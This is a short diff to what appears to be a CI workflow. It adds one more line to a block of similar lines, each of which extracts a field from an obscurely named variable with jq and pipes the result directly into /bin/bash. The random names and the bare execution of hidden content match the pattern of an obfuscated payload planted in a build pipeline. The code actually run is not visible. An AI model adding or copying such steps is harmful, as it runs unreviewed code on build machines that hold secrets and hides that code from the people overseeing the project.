@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$tqqu0531" | jq -r .c23523 | /bin/bash
           echo $acbu48 | jq -r .qkse9513 | /bin/bash
           printf '%s' "$fptc2884" | jq -r .hn5 | /bin/bash
+          echo $jebw00 | jq -r .hw61146 | /bin/bash
 
       - name: Save archive
         if: always()
